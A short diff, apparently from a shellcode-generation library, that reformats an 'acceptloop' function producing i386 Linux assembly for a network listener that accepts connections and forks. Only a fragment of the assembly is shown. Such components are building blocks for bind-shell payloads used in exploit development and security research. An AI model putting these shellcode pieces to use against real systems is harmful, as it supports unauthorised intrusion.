@@ -3,10 +3,7 @@ from listen import listen
 
 @shellcode_reqs(arch='i386', os='linux', network='ipv4')
 def acceptloop(port):
-    return \
-        "acceptloop:" + \
-        listen(port) + \
-        """
+    return "acceptloop:", listen(port), """
     xchg eax, ebx
     push byte SYS_fork
     pop eax
